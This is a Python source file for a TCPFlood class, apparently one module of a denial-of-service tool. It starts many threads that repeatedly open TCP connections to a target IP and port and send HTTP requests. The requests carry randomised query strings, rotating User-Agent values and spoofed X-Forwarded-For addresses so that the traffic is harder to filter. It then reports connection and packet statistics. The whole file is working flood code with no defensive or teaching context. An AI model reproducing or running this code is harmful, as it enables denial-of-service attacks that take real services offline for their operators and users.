import socket
import threading
import time
import random
from .utils import Statistics

class TCPFlood:
    def __init__(self):
        self.stop_flag = False
        self.stats = Statistics()
    
    def start_attack(self, ip, port, threads=100, duration=30):
        self.stop_flag = False
        self.stats = Statistics()
        self.stats.start()
        
        def flood():
            while not self.stop_flag:
                try:
                    sockets = []
                    for _ in range(10):  # 10 connections per cycle per thread
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(2)
                            s.connect((ip, port))
                            
                            # Send raw HTTP request
                            payload = f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
                            payload += f"Host: {ip}:{port}\r\n"
                            payload += f"User-Agent: {random.choice(['Mozilla/5.0','Chrome/120','Safari/537.36'])}\r\n"
                            payload += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                            payload += "Connection: keep-alive\r\n\r\n"
                            
                            s.send(payload.encode())
                            sockets.append(s)
                            self.stats.add_connection()
                            self.stats.add_packet(len(payload))
                        except:
                            self.stats.add_error()
                    
                    # Close all sockets
                    for s in sockets:
                        try: s.close()
                        except: pass
                except:
                    self.stats.add_error()
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            thread_list.append(t)
        
        # Run for duration
        time.sleep(duration)
        self.stop_flag = True
        
        for t in thread_list:
            t.join(timeout=2)
        
        return self.stats.get_report()
    
    def stop_attack(self):
        self.stop_flag = True
        return True
